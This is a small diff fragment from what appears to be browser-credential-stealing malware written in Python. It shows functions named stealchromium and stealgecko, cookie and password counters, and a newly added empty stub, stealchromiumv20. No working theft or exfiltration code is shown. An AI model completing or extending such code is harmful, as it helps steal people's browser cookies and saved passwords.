@@ -356,7 +356,10 @@ def stealchromium():
                    cur.close()
                    con.close()
                    removefile(tmpdir)
-                   
+
+def stealchromiumv20():
+    ...
+    
 def stealgecko():
     global cookie_count
     global password_count
